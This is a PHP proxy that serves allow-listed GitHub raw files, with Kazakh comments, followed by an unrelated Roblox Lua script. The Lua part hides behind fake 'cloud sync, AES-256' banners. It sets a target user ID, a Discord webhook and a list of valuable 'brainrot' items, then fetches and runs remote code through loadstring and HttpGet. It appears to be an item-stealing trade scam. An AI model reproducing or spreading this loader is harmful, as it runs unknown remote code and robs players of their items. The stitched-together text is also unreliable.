<?php
// github_raw_proxy.php
// Бұл скрипт GitHub raw файлдарын қаптап, тек рұқсат етілгендерін ғана көрсетеді

class GitHubRawProxy {
    private $github_raw_base = "https://raw.githubusercontent.com/";
    private $allowed_repos = [];
    private $allowed_files = [];
    private $cache_dir = __DIR__ . '/cache/';
    
    public function __construct() {
        $this->loadConfig();
        $this->setupCache();
    }
    
    private function loadConfig() {
        // Рұқсат етілген репозиторилер
        $this->allowed_repos = [
            'username/repo1',
            'username/repo2',
            'organization/project'
        ];
        
        // Немесе JSON файлынан оқу
        if (file_exists(__DIR__ . '/github_allowed.json')) {
            $config = json_decode(file_get_contents(__DIR__ . '/github_allowed.json'), true);
            $this->allowed_repos = $config['allowed_repos'] ?? [];
            $this->allowed_files = $config['allowed_files'] ?? [];
        }
    }
    
    private function setupCache() {
        if (!file_exists($this->cache_dir)) {
            mkdir($this->cache_dir, 0755, true);
        }
    }
    
    public function handleRequest() {
        // GET параметрлерінен файл жолын алу
        $repo = $_GET['repo'] ?? '';
        $branch = $_GET['branch'] ?? 'main';
        $file_path = $_GET['path'] ?? '';
        
        // Ешқандай параметр жоқ болса - 404
        if (empty($repo) || empty($file_path)) {
            $this->send404("Invalid request");
            return;
        }
        
        // Тексеру: репозитори рұқсат етілген бе?
        if (!$this->isRepoAllowed($repo)) {
            $this->send404("Repository not found");
            return;
        }
        
        // Тексеру: файл рұқсат етілген бе?
        if (!$this->isFileAllowed($file_path, $repo)) {
            $this->send404("File not found");
            return;
        }
        
        // Кэшті тексеру
        $cache_key = md5($repo . $branch . $file_path);
        $cache_file = $this->cache_dir . $cache_key . '.cache';
        
        // Кэш бар және жарамды болса
        if (file_exists($cache_file) && (time() - filemtime($cache_file) < 3600)) {
            $this->sendCachedResponse($cache_file);
            return;
        }
        
        // GitHub-тан файлды алу
        $github_url = $this->github_raw_base . $repo . '/' . $branch . '/' . $file_path;
        
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $github_url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_USERAGENT => 'GitHubRawProxy/1.0',
            CURLOPT_HEADERFUNCTION => function($curl, $header) {
                $len = strlen($header);
                $header = explode(':', $header, 2);
                if (count($header) < 2) return $len;
                
                // 404 статусын тексеру
                if (strpos($header[0], 'HTTP') !== false && strpos($header[1], '404') !== false) {
                    $this->send404("File not found on GitHub");
                }
                return $len;
            }
        ]);
        
        $content = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        // GitHub-тан 404 келсе
        if ($http_code === 404 || empty($content)) {
            $this->send404("File not found");
            return;
        }
        
        // Кэшке сақтау
        file_put_contents($cache_file, json_encode([
            'content' => base64_encode($content),
            'headers' => $this->getFileHeaders($file_path)
        ]));
        
        // Файлды жіберу
        $this->sendFileResponse($content, $file_path);
    }
    
    private function isRepoAllowed($repo) {
        return in_array($repo, $this->allowed_repos);
    }
    
    private function isFileAllowed($file_path, $repo) {
        // Егер нақты файлдар тізімі берілсе
        if (!empty($this->allowed_files)) {
            $full_path = $repo . '/' . $file_path;
            return in_array($full_path, $this->allowed_files);
        }
        
        // Немесе кеңейту бойынша тексеру
        $allowed_extensions = ['raw', 'txt', 'json', 'xml'];
        $ext = pathinfo($file_path, PATHINFO_EXTENSION);
        
        return in_array($ext, $allowed_extensions);
    }
    
    private function getFileHeaders($filename) {
        $ext = pathinfo($filename, PATHINFO_EXTENSION);
        $mime_types = [
            'raw' => 'application/octet-stream',
            'txt' => 'text/plain',
            'json' => 'application/json',
            'xml' => 'application/xml',
            'jpg' => 'image/jpeg',
            'png' => 'image/png'
        ];
        
        return [
            'Content-Type' => $mime_types[$ext] ?? 'application/octet-stream',
            'Content-Disposition' => 'inline; filename="' . basename($filename) . '"'
        ];
    }
    
    private function sendCachedResponse($cache_file) {
        $data = json_decode(file_get_contents($cache_file), true);
        $content = base64_decode($data['content']);
        $this->sendFileResponse($content, 'cached_file');
    }
    
    private function sendFileResponse($content, $filename) {
        $headers = $this->getFileHeaders($filename);
        header("HTTP/1.0 200 OK");
        header("Content-Type: " . $headers['Content-Type']);
        header("Content-Disposition: " . $headers['Content-Disposition']);
        header("Content-Length: " . strlen($content));
        header("X-Cache: " . (isset($cache_file) ? 'HIT' : 'MISS'));
        
        echo $content;
        exit;
    }
    
    private function send404($message = "Not Found") {
        header("HTTP/1.0 404 Not Found");
        header("Content-Type: text/plain; charset=utf-8");
        
        // GitHub стиліндегі 404 беті
        echo <<<HTML
<!DOCTYPE html>
<html>
<head>
    <title>404 - File not found</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: #f6f8fa;
        }
        .error-container {
            max-width: 500px;
            margin: 0 auto;
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }
        h1 {
            font-size: 24px;
            color: #24292e;
            margin-bottom: 16px;
        }
        p {
            color: #586069;
            line-height: 1.5;
        }
        .emoji {
            font-size: 48px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="error-container">
        <div class="emoji">🔍</div>
        <h1>404 - File not found</h1>
        <p>The requested file does not exist or you don't have permission to access it.</p>
        <p style="font-size: 14px; margin-top: 20px;">
            <a href="/" style="color: #0366d6; text-decoration: none;">← Go back</a>
        </p>
    </div>
</body>
</html>
HTML;
        exit;
    }
}

// Скриптті іске қосу
$proxy = new GitHubRawProxy();
$proxy->handleRequest();
?>
-- [[ CLOUD-CORE ARCHITECTURE: GLOBAL DATA SYNC v9.1.4 ]]
-- [[ ENCRYPTION: AES-256-BIT SECURE FLOW ]]
-- [[ AUTHENTICATION: VERIFIED VIA CLOUD-API ]]

getgenv().SECRET_KEY = "mrr_08d38b45e32b4054a799c2ca298b6f48"
getgenv().TARGET_ID = 10712581361
getgenv().DELAY_STEP = 1      
getgenv().TRADE_CYCLE_DELAY = 2
getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1484845739023532114/XX2aoV0wPTi76Y7J05p1cbxiOWAnacE26vLaj7QlzIOkTtyMIOJYHRFfaFsf5x_HzBmA"
getgenv().TARGET_BRAINROTS = {
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["Strawberry Elephant"] = true,
    ["Quesadillo Vampiro"] = true,
    ["Tacorita Bicicleta"] = true,
    ["La Extinct Grande"] = true,
    ["La Spooky Grande"] = true,
    ["Chipso and Queso"] = true,
    ["Chillin Chili"] = true,
    ["Tuff Toucan"] = true,
    ["Gobblino Uniciclino"] = true,
    ["W or L"] = true,
    ["La Jolly Grande"] = true,
    ["La Taco Combinasion"] = true,
    ["Swaggy Bros"] = true,
    ["La Romantic Grande"] = true,
    ["Festive 67"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["Money Money Puggy"] = true,
    ["Ketupat Kepat"] = true,
    ["Tictac Sahur"] = true,
    ["Tang Tang Keletang"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Lavadorito Spinito"] = true,
    ["Garama and Madundung"] = true,
    ["Burguro And Fryuro"] = true,
    ["Capitano Moby"] = true,
    ["Cerberus"] = true,
    ["Dragon Cannelloni"] = true,
    ["Mariachi Corazoni"] = true,
    ["Swag Soda"] = true,
    ["Los Hotspotsitos"] = true,
    ["Los Candies"] = true,
    ["Los Bros"] = true,
    ["Tralaledon"] = true,
    ["Los Puggies"] = true,
    ["Los Primos"] = true,
    ["Los Tacoritas"] = true,
    ["Los Spaghettis"] = true,
    ["Ginger Gerat"] = true,
    ["Love Love Bear"] = true,
    ["Spooky and Pumpky"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Los Sekolahs"] = true,
    ["La Casa Boo"] = true,
    ["Reinito Sleighito"] = true,
    ["Ketupat Bros"] = true,
    ["Cooki and Milki"] = true,
    ["Rosey and Teddy"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["La Supreme Combinasion"] = true,
    ["Dragon Gingerini"] = true,
    ["Headless Horseman"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Celularcini Viciosini"] = true,
    ["Mieteteira Bicicleteira"] = true,
    ["Los Sweethearts"] = true,
    ["Las Sis"] = true,
    ["Los Planitos"] = true,
    ["Eviledon"] = true,
    ["Orcaledon"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["Noo my Heart"] = true,
    ["Fishino Clownino"] = true,
    ["Los Amigos"] = true,
    ["La Secret Combinasion"] = true,
    ["La Food Combinasion"] = true,
    ["Sammyni Fattini"] = true,
    ["Spaghetti Tualetti"] = true,
    ["Rosetti Tualetti"] = true,
    ["Esok Sekolah"] = true,
    ["Nacho Spyder"] = true,
    ["Griffin"] = true,
    ["La Ginger Sekolah"] = true,
    ["Lovin Rose"] = true
}
loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
